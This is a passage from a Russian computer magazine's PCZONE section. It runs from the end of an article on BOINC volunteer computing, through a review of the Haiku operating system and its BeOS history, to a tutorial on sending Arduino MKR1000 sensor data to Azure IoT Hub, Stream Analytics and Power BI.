  К примеру, если заняты от пяти до восьми логических ядер из восьми, то
они начинают ждать друг друга и скорость выпол нения каждого задания пада‐
ет почти вдвое. В таком режиме ты выполняешь больше заданий одновре‐
менно, но выигрыша по общей производительности не получаешь. Гру бо
говоря, за то время, пока Core i7 сделает восемь заданий, Core i5 выполнит
две порции по четыре. Какой‐то прирост производительности от HT ты
заметишь только в редких случаях.
  В большинс тве проектов HT просто затягивает вычисления и требует
дополнительных изменений. Проблемы начинаются, если одновременно
запущены задания для ЦП и задания с оптимизацией для выполнения на GPU
посредством OpenCL. Последние обычно используют одно ядро ЦП, но иног‐
да нагружают его не пол ностью (на 0,01–0,976). В таких случаях приходится
либо подбирать нестандартное значение (например, использовать 36%
ядер), либо вовсе отклю чать HT через BIOS. Иначе задания выполняются
с ошибками.


Где мои задания?
Если несколько заданий подряд выпол няются с ошибкой, то сервер проекта
временно блокирует учетную запись и перестает отправлять на нее задания.
Это не единственная причина, по которой ты можешь не получать их. Чтобы
узнать, на чьей стороне ошиб ка, отыщи на страничке про екта ссылку на ста‐
тус сервера. Если он online и в очереди есть накопленные задания, то смотри
свои настройки.





             Текущее состояние сервера и очереди заданий

В первую очередь проверь активность проекта, наличие приостановленных
заданий, объем запасаемых и выделенные для них ресурсы. Разобраться
поможет лог клиента BOINC, вызываемый по Ctrl‐Shift‐E.


(НЕ)ЭФФЕКТИВНОСТЬ BOINC
Текущее состояние сети BOINC можно увидеть здесь. Теоретическая оценка
ее средней скорости расчетов сейчас составляет 154,5 петафлопс. Это боль‐
ше, чем у двух самых мощных суперкомпьютеров в мире — Sunway TaihuLight
(93 петафлопс) и Tianhe‐2 (34 петафлопс), вместе взятых.
  Но это теория. В реальности не все программисты утруждают себя опти‐
мизацией кода, а пользователи — настройкой клиентов. Для многих проектов
реальная скорость обработ ки составля ет менее 10% от теоретически воз‐
можной. Вместо нескольких минут они считаются час‐два, по дороге выпол‐
няя массу бессмысленных операций.
  Доброволь цы тоже хороши. Как пишут в Nature, волонтеры BOINC сегодня
больше отнимают ресурсов, чем предоставля ют сами. Только 6–8% поль‐
зователей регулярно выполняют задания. Остальные впустую шлют запросы
на серверы проектов, набирают десятки заданий и потом не выполняют
ни одного. Вместо помощи науке получается DDoS.
  На момент написа ния статьи в BOINC было 348 тысяч (то есть, 8,09%)
активных пользователей. Для новых участников это означает быстрый и лег‐
кий старт. На фоне толпы бездельников ты поначалу будешь легко улучшать
свои результаты каждый день. Настоящая кон куренция начнется уже в top
500 000 или позже.


                  BOINCИзвес тные проб лемы
Внутри сообщества BOINC сложилась парадоксальная ситу ация, и тому я
вижу несколько причин:
 • пользователи не понимают значимость участия в распределенных вычис‐
   лениях;
 • основная масса добровольцев не может настроить BOINC так, что бы он
   не мешал обычной работе, а задания загружались в разумном объеме
   и выполнялись в срок;
 • владельцы мощных компьютеров  охот нее майнят криптовалюту, чем
   выполняют научные расчеты.

Между участниками добровольных вычислений и авторами научных проектов
часто лежит квалификационная пропасть, которая мешает найти общий язык
и почувствовать сопричастность. Простым людям хочется увидеть итог мно ‐
голетних расчетов, осознать свой небольшой, но значимый вклад в мировую
науку. Вместо этого они видят только растущие счета за электроэнергию.
  Многие проекты РВ дают интересные результаты, но участники попросту
не знают о них. Все достижения публику ются в специализирован ной литера‐
туре, большая часть из которой выходит на английском языке. Если они
и появляются в региональной научно‐популяр ной печати, то в сильно иска‐
женном виде.



ЭКСПЕРИМЕНТ LETUNCHIK
Вместе с друзьями я пробовал запускать расчеты на самой разной технике:
домашних и рабочих компьютерах, мини‐серверах, медиацентрах, ноутбуках
и смартфонах. BOINC — кросс‐платформенная шту ка и может работать прак‐
тически с чем угодно.
  Для подобных экспериментов мы использовали учет ную запись с веселым
названием Letunchik. Вскоре она объ единила в себе более двадцати узлов.
Хоть многие из них не задерживались надолго, нам все равно удалось дос‐
тичь некоторых заметных результатов.
  Многие годы основным проектом для нас был theSkyNet POGS, задания
которого выполняются на ЦП без ускорения видеокартой и дают мало очков.
Сейчас мы занимаем в нем 27‐е место среди российских участников. Учетная
запись Letunchik занима ет 11 491 место из 4,3 мил лиона аккаунтов BOINC
во всем мире и входит в top 500 российских (376 место).
  Мы никогда не гнались за очками, устраивали перерывы в работе и вооб‐
ще  вяло  поддерживали  сорев новательный  дух.  Тем  не  менее  даже
без фанатизма мы постепенно вошли в 0,3% самых активных аккаунтов. Наш
текущий результат лучше, чем у 99,73% участников. Все эти цифры говорят
не о том, что мы круто считаем. Это большинство считает еще менее
эффективно.
PCZONE


О ЛЮБВИ

ЗНАКОМИМСЯ С
ЭКЗОТИЧЕСКОЙ
ОС HAIKU,
ПРЕЕМНИЦЕЙ
BEOS





     Евгений Зобнин
        zobnin@glc.ru





Что, если я скажу тебе, что у меня есть операционка с прос‐
тым и удобным интерфейсом, 64‐битной файловой сис‐
темой, всем необходимым для жизни софтом и хорошей
поддержкой оборудования, минималь ные системные тре‐
бования которой — Pentium II с 64 Мбайт оперативки? Время
ее  загрузки  составляет  примерно  секунду,  программы
запускаются молниеносно, а архив с дистрибутивом занима‐
ет около 300 Мбайт. Эта система называется Haiku, и я опи‐
сал лишь часть ее достоинств.


Haiku определенно одна из самых интересных альтер нативных операционок.
Это не очередной дистрибутив  Linux, не специализированная система
для роутеров или IoT, не адаптированный для десктопа Android, а написанная
с нуля полноценная пользовательская ОС, основу которой когда‐то давно
заложили бывшие инженеры Apple.


ИСТОРИЯ
На дворе 1990 год. Windows только что обновилась до версии 3.0, актуальный
венец творения  Intel — процессор 80486, а Стив Джобс, покинув Apple,
работает в основанной им фирме NeXT. Там создают компьютеры на базе
операционки следующего поколения, которая через семь лет, после возвра‐
щения Джобса в Apple, ляжет в основу современной macOS.
  Однако Джобс — не единственный исполнительный директор Apple,
который покинул компанию, чтобы заново сделать персональный компьютер.
Его опыт повторяет Жан‐Луи Гассе, быв ший директор французского под‐
разделения, который сменил Джона Скал ли на посту главы Apple (Скалли зна‐
менит тем, что вытеснил Джобса, но, как мы видим, сам в руководстве не пре‐
успел).
  Покинув Apple, Гассе основал стартап Be. Его целью было создать прос‐
той в использовании, но мощный ПК. И если с железом проб лем не воз‐
никло — сначала использовались процессоры AT&T Hobbit, затем PowerPC
со стандартной обвеской, — то операционку пришлось создавать с нуля. Так
появилась BeOS, невероятно продвинутая по тем временам система,
которая уделывала тогдашние версии Mac OS и Windows, причем с осо бой
грацией — демонстрируя ошеломляющую производительность, отзывчивость
и плавность работы в любых ситуациях.





  Десяток одновремен но запущенных игр — для BeOS это были пустяки

К сожалению, удача повернулась к Гассе совсем не тем местом, которое он
ожидал увидеть, и компьютер BeBox провалился, а за ним в трясину стаг‐
нации последовала BeOS. По пла нете победно шагали IBM PC совместимые
компьютеры, а план продаться Apple не выгорел: там выбрали джобсовский
NeXT. Заработать на лицензировании BeOS производите лям ПК у Гассе тоже
не вышло, и мытарства компании продолжались до 2001 года, когда остатки
бизнеса купила Palm. Там BeOS и была похоронена окончательно.
   Случись эта история сегодня, возможно, никто и не заметил бы кончины
очередного стартапа, но тогда, во времена Windows 95/98 и ущербной ста‐
рой версии Mac OS, BeOS просто очаровывала пользователей. Настолько,
что многие из них организовались в небольшие группы и пытались улучшать
и переписывать куски системы, а в 2002 году объединились в проект Open‐
BeOS, который поставил себе целью переписать BeOS с нуля.
  И знаешь что? Они ее действительно переписали, каждый компонент, каж‐
дую библиотеку, воссоздали оригинальный интерфейс и даже сделали икон‐
ки, придумав для них компактный векторный формат. Alpha‐версия Haiku (ста‐
рое название отбросили из‐за воз можных судебных исков) была опубликова‐
на в 2009 году и могла без всяких проблем запускать приложения оригиналь‐
ной BeOS и даже использовать ее драйверы. Это была почти полная копия
BeOS с файловой системой BFS, идентичным рабочим столом и набором
предустановленных приложений.
  С тех пор прош ло уже восемь лет, а Haiku продолжает развиваться.
Без былого энтузиазма, медленно, но верно идет к цели релиза 1.0. От ори‐
гинальной BeOS она ушла очень далеко: появилась поддержка USB 3.0,
сетевых  драйверов  FreeBSD,  собственный  репозиторий  приложений
с тысячью пакетов, браузер на базе современной версии WebKit, все мыс‐
лимые медиакодеки и портированные версии множества свободных при‐
ложений (да, в Haiku есть Vim, Git, SSH, Transmission и Thunderbird).
  Подробнее о старых временах ты можешь прочесть в статье «История
операционной системы BeOS», а мы же посмотрим на ту Haiku, которая есть
сегодня, и прикинем, на что годна эта необычная система.


СОВРЕМЕННАЯ HAIKU
Haiku можно охарактеризовать как частично совместимую с UNIX систему
на базе гибридного ядра, оптимизирован ную для десктопов. Последнее
означает не только наличие удобного графического интерфейса, но и воз‐
можность использования потоков и исполнение приложений в режиме реаль‐
ного времени. В Haiku есть развитые фреймворки для работы с мультимедиа
и трансляторы файловых форматов: чтобы научить все доступные для Haiku
просмотрщики приложений понимать новый формат изображений, необ‐
ходимо всего лишь добавить в систему транслятор.
   Haiku —  по‐настоящему быстрая  и  отзывчивая  система.  Загрузка
до рабочего стола продол жается не дольше секунды, приложения откры вают‐
ся мгновенно, тяжелые задачи вроде компиляции исходников никак не влияют
на работу других приложений. Система по пол ной использует SMP, распре‐
деляя нагрузку на процессорные ядра, и распараллеливает потоки обработки
логики и интерфейса приложений, отдавая последним приоритет в любых
ситуациях. В системе вообще нет такого понятия, как курсор со значком
песочных часов, он тут просто не нужен.
  Интерфейс Haiku прост, но не без своих особенностей. В его основе
лежат программы Tracker и Deskbar. Tracker — это файловый менед жер,
который отвечает в том числе за создание иконок на рабочем сто ле. Deskbar
отображает кнопку «Пуск», трей, часы и список открытых приложе ний.





               Десктоп, Deskbar и меню приложений


Сам оконный интерфейс вполне стандар тный, за исключением весьма ори‐
гинального метода отоб ражения имени окна — оно напоминает карточку
в картотеке. Такой дизайн позволяет объединять несколько окон в одно окно
с вкладками; для этого достаточно зажать кла вишу Win и перетащить одно
окно в другое. Для переключения между окнами можно использовать левый
или правый клик, причем правый делает активным предыдущее окно.





                              Tracker, терминал и Vim


Haiku поддерживает виджеты на рабочем столе, причем появились они еще в
BeOS, то есть до начала двухтысячных. Вид жеты называются репликантами
и не являются отдельной сущностью. Фактически это часть другого приложе‐
ния, которую можно вытянуть на рабочий стол. Например, можно запустить
монитор системы и перетащить графики загруженности в десктоп, а потом
закрыть сам монитор.





            Монитор системы, часы и их репликанты


Есть здесь и местный док, одна ко выполнен он в формате отдельного окна,
которое можно крепить к краю экрана. Другие приложения его перек рывают,
так что польза от него под большим сомнением.





                     Док, терминал и почтовый клиент


Haiku — UNIX‐подобная система, поэтому все личные файлы она складиру ет
в каталог home, заботливо размещенный на рабочем столе. При клике
по иконке откроется Tracker, довольно простой, но удобный файловый менед‐
жер, работающий в тесной кооперации с файловой системой BFS.
   Как и ее пред шественница BeOS, Haiku спроектирована для повсеместно‐
го использования расширенных атрибутов (метаданных) файловой системы.
Поэтому, кроме имени файла, его размера и места расположения, системе
также известны многие другие данные.
  Например, все предустанов ленные приложения здесь хранятся в каталоге
/system/apps. Но для системы и Tracker это не просто файлы. Она знает, что
это приложения для конкрет ной версии ОС, помнит версию программы и имя
автора. Вся эта информа ция записана в файловую систему и прикрепле на
к файлу. С точки зрения системы список приложений в Deskbar и список фай‐
лов в Tracker абсолютно равнозначны. Кстати, как и в macOS, приложение
в Haiku выглядит как файл и устанавливается простым копированием на диск,
точнее — в папку /system/app.





         Tracker и несколько вариантов отоб ражения списка файлов


Еще одна интересная черта Tracker — это пол ное отсутствие концепции
копирования и вставки. В контекстном меню есть пункт «Копировать в» —
если выбрать его, то появит ся подменю со списком каталогов, с помощью
которого можно выбрать место назначения. Как ока залось, это действитель‐
но очень быстрый и удобный способ копирования и перемещения файлов.





                         Tracker и меню копирования


В комплект Haiku входит браузер WebPositive, который пришел на смену уста‐
ревшему NetPositive из BeOS. WebPositive основан на современной версии
движка WebKit, поддерживает историю и табы, но иногда сбо ит и притор‐
маживает.





                   WebPositive, xakep.ru и юные съемщицы


Есть и встроенный терминал, с помощью которого можно работать в коман‐
дной строке. И это не какой‐то местный cmd.exe, а вполне стандартный bash
со стандартным же набором команд UNIX и возможностью работы напрямую
с устройствами через файлы каталога /dev (да, можно записать образ
на флешку с помощью dd). Система фактически одно пользовательская,
поэтому стан дартный уровень доступа — root.





                 Терминал, файлы устройств и пакеты


В комплекте с системой идет email‐клиент, всеядный мультимедиапроигры‐
ватель и конвертер, редактор для программистов, отладчик, приложение
для разбивки диска, приложение для захвата видео с камеры, ТВ‐тюнер,
редактор иконок, диктофон, калькулятор, просмотрщик PDF и другие полез‐
ные в хозяйстве вещи. В целом стандартный десктопный набор, которого хва‐
тит для использования системы в «режиме домохозяйки». Но есть и местный
магазин приложений.





                            MediaPlayer и Sintel


СТОРОННИЕ ПРИЛОЖЕНИЯ
За все время существования BeOS для нее были написаны тысячи различных
приложений, среди которых есть порты с других платформ (из важного — Op‐
era, Flash Player, Real Player, Java). Все эти приложения прекрасно работают
в Haiku, но уже давно устарели. На смену им пришли портированные версии
опенсорсных приложений, а также модернизированные сборки старых прог‐
рамм BeOS, исходные коды которых были открыты. И те и другие можно уста‐
новить, используя магазин HaikuDepot.





                              HaikuDepot


Вот лишь малая часть программ, которые можно найти в репозитории:
 • OpenJDK — Java, вполне пригодная к использованию;
 • NetSurf — простой и очень быстрый браузер с под держкой CSS;
 • qBittorrent — всем известный torrent‐клиент;
 • MailNews — форк Mozilla Thunderbird;
 • qutIM — многопротокольный IM‐клиент;
 • QupZilla — браузер на движке WebKit;
 • SMPlayer/VLC — всеядные медиаплееры;
 • BeFAR — клон FAR Manager;
 • QEmacs/Vim — редакторы из мира UNIX;
 • Git/CVS — системы контроля версий;
 • OpenSSH — SSH‐клиент и сервер;
 • QEMU — эмулятор ПК (без поддержки хар дварного ускорения);
 • ScummVM — интерпретатор квестов от Lucas Arts и других;
 • Mednafen — эмулятор Game Boy, SNES, Sega, PSX.





                         NetSurf с тремя вклад ками


Все приложения распространяют ся в бандлах с расширением hpkg и после
скачивания попадают в каталог /system/packages. За ним постоянно следит
демон package_daemon и при появлении нового пакета сразу монтирует его
содержимое в систему, так, чтобы приложение появилось в /system/apps.
Это позволяет устанавливать пакеты, просто копируя их в /system/packages,
и удалять, как обычные файлы.
  Для управления пакетами из командной строки есть команда pkgman. С ее
же помощью можно обновлять саму Haiku до акту альной версии. Для этого
необходимо всего лишь добавить новый репозиторий и запустить процесс
обновления:


$ pkgman add‐repo http://download.haiku‐os.org/haiku‐repositories/
master/$(getarch)/current/
$ pkgman update


ПОДДЕРЖКА ОБОРУДОВАНИЯ
Haiku поддерживает процессоры архитектур x86, x86_64, ARM и PowerPC.
Минимальные системные требования — Pentium  II и 64 Мбайт оперативки,
а рекомен дуемые — Pentium  III и 256 Мбайт. Поддерживают ся прак тически
все современные видеоадаптеры, но без хар дварного ускорения (работы
по портированию драйверов Gallium3D из Linux идут уже который год). Зву‐
ковая карта тоже должна заработать без проб лем, равно как и сетевые карты
и адаптеры Wi‐Fi (Haiku использует драйверы FreeBSD). Кроме того, будет
работать Bluetooth вплоть до версии 5.0. Поддерживаются файловые сис‐
темы FAT, ext3, ext4, NTFS, ReiserFS в режиме чтения и записи, Btrfs и exFAT
в режиме чтения.
  Однако все это теория. На практике тебя могут ждать разные сюрпризы.
Поставив Haiku на ноутбук Lenovo ThinkPad X220, я уже было обрадовался, что
система смогла опознать вообще все железные компоненты, включая кар‐
тридер, беспроводную мышь, показа ла реальное значение заряда аккумуля‐
тора и даже определила корректное значение DPI экрана и позволила нас‐
троить внешний монитор отдельно от экрана ноутбука. Однако Wi‐Fi приш‐
лось настраивать вручную. На ASUS Eee PC 1001PXD Haiku вообще не смогла
пройти дальше загрузочного экрана.
  Кроме того, ночные сборки Haiku, в которых появ ляются все новые вкус‐
ности, зачастую нестабильны и непригод ны для повседневного исполь‐
зования,  а  в  последней  более‐менее  стабильной  альфе, вышедшей
в 2012 году, недостает поддержки USB 3.0, полноценного магазина приложе‐
ний и новых драйверов.


ВЫВОДЫ
В заключение я мог бы ска зать, что Haiku — достойная опе рационка, которую
стоит глянуть для общего развития, но после подробно го знакомства с ней
скажу по‐другому: Haiku просто влюбляет в себя. Когда я начал писать этот
обзор, то думал, что из этого выйдет что‐то наподобие изу чения заниматель‐
ного музейного экспоната вроде бивня мамонта или какой‐нибудь окамене‐
лости. Но в результате я увидел вовсе не окаменелость, а отличную, про ‐
думанную, производительную, не перегружен ную хла мом ОС.
   Лично для меня эта система если не идеальна, то близка к идеалу.
Это пример того, какой на самом деле может быть десктопная ОС, если
не тащить в нее все подряд, а реализовать только то, что действительно нуж‐
но. Но реализовать это правильно.
   Haiku проста как сапог, но в этой простоте ее мощь. Здесь все на своих
местах и работает ровно так, как и дол жно работать. Ее не совсем стандар‐
тные решения не раздражают, как это обычно быва ет. Наоборот, к ним быс‐
тро привыкаешь и оцениваешь их удобство. Ощущения, что какой‐то функции
недостает, у меня не возникло ни разу.
   Да, в текущем виде Haiku не допилена, нестабильна, поддерживает не все
железо и работа ет не на всех устройствах. Ее шансы на покоре ние мира
исчезающе малы — возможно, еще меньше, чем у BeOS двадцать лет назад.
Но при этом перед нами юзабельная, удобная и быстрая система — обя‐
зательно попробуй ее, если еще не сделал этого.


        WWW

                     •Ноч ные сборки Haiku
                    •Список поддерживаемо го оборудования
                      •Русскоязыч ный блог о Haiku
                      •Русскоязыч ное   сообщество   пользователей
                           Haiku
                    •Исходники  многих  при ложений  для  BeOS
                       и Haiku
PCZONE
     ЦЕНТР
ИНТЕРНЕТА
  ВЕЩЕЙ





    Алексей Соммер              ПОДКЛЮЧАЕМ ARDUINO    asommer@yandex.ru
                       К AZURE IOT HUB




В прошлом году компания Microsoft анонсировала облачный
бэкенд для управления умными прибора ми и интегри рован‐
ной электроникой. Azure IoT Hub позволяет с минимумом
программирования  настра ивать  взаимодействие  между
устройствами и встра ивать его в свои про екты на основе
Azure. Чтобы посмотреть, как это работает, мы раз берем
простую задачу — отправку в обла ко показаний датчика,
подключенного к контроллеру Arduino.


Итак, перед нами простейший прибор. Он состоит из контроллера, неболь‐
шой макетной платы, фоторезистора (датчика света) и стабилизирующего
резистора.  В   качестве  контрол лера  используется  Genuino  MKR‐
1000 со встроенным Wi‐Fi — если хочешь такой же, то он обойдется в 35 дол‐
ларов. Питается пла та от micro‐USB.





В принципе, дат чик можно было поставить любой — это никак не повлияет
на наши дальнейшие пла ны. На картинке ниже изображена схема, по которой
наше устройство будет общаться с облаком.





Девайс шлет данные в IoT Hub, где, пройдя через сервис Stream Analytics, они
попадают в базу дан ных и обрабаты ваются при помощи Power BI. Со всеми
этими вещами мы разберемся чуть позже, а пока давай начнем с основ.


             INFO

                   В конце статьи есть исходни ки получившегося
                      проекта. Не забудь посмотреть их, если планиру‐
                    ешь сделать что‐то похожее.


IoT Hub официально переводится на русский как «Центр интернета вещей».
Он может как получать данные с устройств, так и отправлять им сообщения
или коман ды.
  Кроме IoT Hub, взаимодействовать с устройствами может и еще один сер‐
вис под названием Event Hub («концентратор событий»). Он отличается боль‐
шей пропускной способностью, но шлет сообщения только в одном нап‐
равлении — от устройства в обла ко. IoT Hub поддерживает такие протоколы,
как MQTT, MQTT через WebSocket, AMQP, AMQP через WebSocket и HTTP.
Event Hub поддерживает AMQP, AMQP через WebSocket и HTTP. Подробнее
о разнице между хабами и о том, как использовать их вместе, можешь про‐
читать на сайте Microsoft. Мы же изучим IoT Hub (он поинтереснее).
  Ты можешь сам написать код, который фор мирует сооб щение по пра‐
вилам протокола и отправляет его, но гораздо проще использовать для этого
SDK. Я покажу, как это делать, а заодно разберемся с настройкой хаба и дру‐
гих сервисов Azure.


СОЗДАНИЕ IOT HUB
Нам надо создать IoT Hub на одно устройство. До 8000 сообщений в день
и до 0,5 Кбайт на сообщение сервис бесплатен, и нам этого пока что за глаза
хватит. Название можешь задать любое.


             INFO

                      У IoT Hub есть возможность получать с устрой ства
                    файлы. Иногда это используют в качес тве легаль‐
                        ного хака. Данные с нескольких девайсов переда‐
                      ются одно му главному устрой ству, которое сох‐
                       раняет их в текстовый файл определенного вида
                      и отправляет в облако.





После создания нам необходимо зайти в политики обще го доступа.





Копируем строку подклю чения — это первичный ключ. Он нам еще понадо‐
бится.





СОЗДАНИЕ DEVICE-TWIN И ПОЛУЧЕНИЕ SAS
Теперь нам нужно создать виртуаль ное устройство в облаке Azure, которое
будет  соответствовать  нашему  реальному  устройству.  По‐английски
это называется device‐twin, что означает устройство‐двойник. Создать его
можно с помощью утилиты Device Explorer для Windows (ищи наибо лее све‐
жий SetupDeviceExplorer.msi) или кросс‐платформенной утилиты iothub‐ex‐
plorer. Мы рассмотрим второй вариант.
  Для установки iothub‐explorer тебе понадобится NPM, Node.js Package
Manager. Установив его, пиши в консоли:


npm install ‐g iothub‐explorer@latest

После установки подключимся к нашему хабу:


iothub‐explorer login "строка подключения"

В кавычки подставь первичный ключ, который ты получил при создании хаба.
  После подключения создаем device‐twin:


iothub‐explorer create myDeviceId ‐‐connection‐string

В качестве myDeviceId можешь придумать и ввести любой удобный иден‐
тификатор.
  В результате выполнения команды будет выведена строка подключения —
connectionString. Это и есть SAS, Shared Access Signature. Скопируй ее себе
и сохрани — она понадобит ся для общения с хабом. Но если вдруг забыл
записать ее, то ничего страшного: список устройств с их параметрами под‐
ключения можно в любой момент получить при помощи команды iothub‐ex‐
plorer list.
  В итоге у тебя будет две строки подключения. Одна — для того, что бы под‐
ключать ся к хабу из утилиты iothub‐explorer (ее мы взяли на портале Azure),
вторая (SAS) — для того, чтобы устройство могло подключаться к IoT Hub.
Не путай их.


        WWW

                        •Device Explorer
                      •Страница о «двойниках» в официальном ману‐
                         але
                     •Полный список команд утилиты iothub‐explorer



ПРОШИВАЕМ ARDUINO СЕРТИФИКАТОМ SSL
Для аутентификации в Azure IoT Hub мож но выбирать из двух вариантов: SSL +
SAS или SSL + X.509. Но ресурсов Arduino хватает только на первый из них.
Все‐таки это устройство с малым пот реблением энергии и ограниченными
вычислительными возможностями.
  В любом случае нам нужно прошить нашу пла ту SSL‐сертификатом. Сде‐
лать это можно с помощью кросс‐платформенной утилиты WiFi101 Firmware
Updater или же через Arduino IDE.
  Первым делом ставим библиотеку WiFi101 в Arduino IDE.





После ее установки в IDE появят ся примеры использования этой библиотеки.
Один из примеров под названием FirmwareUpdater необходимо открыть
и записать на пла ту.





Открыв и запустив его, выбираем нашу плату (пла ты для IoT пока что не входят
в комплект поставки IDE по умол чанию).





Открываем менеджер плат и ищем необ ходимую плату. В моем случае
это MKR1000.





После установки в том же самом разделе меню необ ходимо пометить
используемую плату.





Затем выбрать порт, к которому она подключена.





Выбирай Sketch — Upload, и скетч будет загружен на плату. Теперь можно
прошивать.
  Первый вариант: открыть в IDE меню Tools — WiFi101 FirmwareUpdater,
нажать Add domain и добавить URL хаба.





Теперь жмем Upload Certiﬁcates to WiFi module, и готово.
   Как вариант — можешь открыть отдельную утилиту WiFi101 Firmware Up‐
dater, ввести адрес хаба (в моем случае ArduinoAzureHub.azure‐devices.
net) в верхнее текстовое поле и нажать кнопку Fetch. Сертификат загрузится
на компьютер. После этого нужно выбрать COM‐порт, к которо му подключено
устройство, и нажать появив шуюся кнопку Upload certiﬁcates.
                   ← НАЧАЛО СТАТЬИPCZONE
      ЦЕНТР
ИНТЕРНЕТА
  ВЕЩЕЙ
              ПОДКЛЮЧАЕМ ARDUINO
                       К AZURE IOT HUB





ПИШЕМ СКЕТЧ И ИСПОЛЬЗУЕМ AZURE IOT HUB LIBRARY FOR
ARDUINO
Устанавливаем следующие библиотеки точно так же, как мы устанавливали
WiFi101:
 • AzureIoTHub;
 • AzureIoTUtility;
 • AzureIoTProtocol_MQTT;
 • AzureIoTProtocol_HTTP;
 • NTPClient;
 • RTCZero.

Скачиваем исходный код IoT Hub library for Arduino из официального репози‐
тория Azure. В папке examples находим проект simplesample_http и открываем
его.
   Удаляем  или  комментируем  строку  Serial.setDebugOutput(true)
из метода initSerial().
  В файле simplesample_http.c присваиваем переменной connection‐
String значение строки подключения, которую мы получили от  iothub‐
explorer.
  В файле simplesample_http.ino заполняем зна чения переменных ssid
и pass соответственно названием нашей точки доступа Wi‐Fi и ее паролем.
После этого код скетча становится рабочим и его можно загружать в Arduino.
  На мой вкус, пример из Azure IoT library for Arduino не такой уж и simple.
Поэтому предлагаю свой упрощенный вариант файла simplesample_http.c.
  В этом примере с пина под номером 1, к которому на нашей плате под‐
ключен датчик, каждую секунду снимают ся показа ния. Данные отправляются
в облако в виде строки deviceId и целого числа iotdata.
  В качестве иден тификатора устройства (deviceId) в коде исполь зуется
его название. Если такую программу потребу ется запускать на нескольких
устройствах, то ID нужно будет делать разным. Это описывается в модели
данных:


BEGIN_NAMESPACE(IoTSample);
DECLARE_MODEL(LightSensorDataModel, WITH_DATA(ascii_char_ptr,
deviceId), WITH_DATA(int, iotdata));
END_NAMESPACE(IoTSample);

А следующий кусок кода заполняет модель дан ными и отправляет сооб щение
в IoT Hub каждую секунду:


myIoTdata = CREATE_MODEL_INSTANCE(IoTSample, LightSensorDataModel);
if (myIoTdata == NULL)
{
  (void)printf("Failed on CREATE_MODEL_INSTANCErn");
}
else
{
  while (1)
  {
    myIoTdata‐>deviceId = "ArduinoMKR";
    myIoTdata‐>iotdata = analogRead(1);
    unsigned char* destination;
    size_t destinationSize;
    if (SERIALIZE(&destination, &destinationSize, myIoTdata‐>deviceId
, myIoTdata‐>iotdata) != CODEFIRST_OK)
    {
      (void)printf("Failed to serializern");
    }
    else
    {
      sendMessage(iotHubClientHandle, destination, destinationSize);
    }
    IoTHubClient_LL_DoWork(iotHubClientHandle);
    ThreadAPI_Sleep(1000);
  }
  DESTROY_MODEL_INSTANCE(myIoTdata);
}

Более подробно о библиотеках и методах, использованных в этом скетче,
можешь прочитать в официаль ной документации Microsoft.


ПОДКЛЮЧЕНИЕ ДРУГИХ СЕРВИСОВ AZURE
Azure поддерживает массу вариантов хра нения дан ных. Мы попробуем самый
популярный из них — SQL Server (хотя, если будешь работать с JSON в боль‐
ших объемах, тебе скорее подойдет NoSQL).
  Цены на SQL Server начинаются от 5 долларов в месяц за 2 Гбайт. Однако
получить то же самое можно и бесплат но. Во‐первых, есть пробный период
на месяц — тебе выдадут виртуаль ные 200 дол ларов, которые ты можешь
распределить по своему усмотрению. Во‐вто рых, сейчас у Azure работает
программа, по которой ты можешь получать 25 долларов каждый месяц
в течение года. Для этого необходимо зарегистрироваться на портале Visual
Studio Dev Essentials. Да, придется оста вить номер своей кредитки, но если
тебя пугает перспектива на что‐то подписаться и слу чайно выйти за бесплат ‐
ный лимит, то рекомендую обзаводиться виртуальной картой.
  Впрочем, вернемся к технической стороне дела. Ману ал по созданию
базы довольно объемный, и никаких под водных камней в этом процессе нет,
так что отправляю тебя к официальной документации.
   Когда база  готова, переходим  к созданию  таблицы. Это делается
при помощи SQL Server Data Tools из Visual Studio. Если у тебя уже стоит Visual
Studio 2015 или новее, то дополнительно ничего устанавливать не нужно.
  Открывай Visual Studio и выбирай в меню View → Server Explorer. Здесь
можно подключиться к учетной записи Azure и открыть базу в SQL Server Ob‐
ject Explorer.





В этом окне можно будет создать таб лицу.





Один момент, о котором обя зательно нужно упомянуть. Из соображений
безопасности доступ к SQL Server по умол чанию закрыт со всех внешних IP‐
адресов. То есть, даже зная имя пользователя и пароль, подключиться к базе
со своего компьютера просто так нельзя. Чтобы сделать это, сначала зайди
на портал Azure и добавь свой IP в список разрешенных.





  Шутка, что в IoT буква S отвечает за Security, в дан ном случае не работа‐
  ет


STREAM ANALYTICS
Второй важный для IoT сервис Azure — это Stream Analytics. Если мы хотим
сохранить дан ные из IoT Hub в базу данных, то нам нужен именно он.
  Подключить его очень просто: придумай название, выбери группу ресур‐
сов и тот же регион, что и у остальных сервисов (если сервисы в разных реги‐
онах, то оплата может быть выше). В результате должно выйти примерно
как на скриншоте.





Нажми на квадрат с надписью «Входные данные», задай им псевдоним и ука‐
жи свой IoT Hub в качестве источника.





Так же настраиваем выходные данные.





Теперь можно создать запрос, который будет перекидывать данные из хаба
в базу. Кликай на квадрат между входными и выходными данными и вводи его.
В моем примере запрос довольно простой:


SELECT
    iotdata, deviceId, System.Timestamp as eventtime
    INTO dataout
FROM
    indata

Как можешь заметить, язык запроса похож на SQL. В данном слу чае и в базе
данных, и в коде Arduino есть поля iotdata (целочисленное) и deviceId
(строка). Кроме того, в базе данных создано поле eventtime типа datetime.
В момент перемещения данных сюда будет записы ваться вре мя события.


POWER BI
Буквы BI в названии Power BI означают Business Intelligence, но пусть тебя
не смущает серьезность этих слов. Сама утилита не сложнее, чем Excel,
и предназначена для того, чтобы, подключив шись к SQL Server, получать дан‐
ные в виде графика или диаграммы.
  Работает это несложно. Нажимаем «Получить дан ные → Дополнительные
сведения…».





Вводим адрес нашего сервера и имя базы данных. Эта информация задается
при создании базы дан ных SQL Server.





У тебя запросят имя пользователя и пароль от базы. Вводи их.





Выбираем нужную таблицу.





В результате получаем такой график.





ЗАКЛЮЧЕНИЕ
Итак, мы сделали несложное устройство, которое отсы лает данные о сво ей
работе в облако, а также научились сох ранять и анализировать эту информа‐
цию средствами Azure. При желании мы могли бы не только получать сооб‐
щения, но и отправлять команды. Таким образом, устройство теперь имеет
надежное и безопасное подключение к интернету, и взаимо действие с ним
не ограничено локальными радиопротоколами. Ну и конечно, на практике
речь может идти не об одном Arduino у тебя на столе, а о массовом продук те,
каждый из экземпля ров которого поддерживает связь с серверным бэкен‐
дом.


        WWW

                   Наш альтернативный вариант simplesample_http
                        качай здесь.
PCZONE





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



      EASYEDA И CIRCUIT SIMULATOR — СЕРВИСЫ, КОТОРЫЕ
